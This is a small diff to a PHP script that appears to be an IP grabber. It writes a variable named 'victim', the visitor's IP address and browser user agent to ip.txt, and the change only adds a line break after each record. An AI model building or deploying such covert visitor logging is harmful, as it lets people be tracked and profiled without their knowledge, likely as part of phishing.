@@ -14,6 +14,7 @@ else
     }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
+$space = "\r\n";
 
 
 $file = 'ip.txt';
@@ -24,6 +25,6 @@ fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
 fwrite($fp, $browser);
-
+fwrite($fp, $space);
 
 fclose($fp);
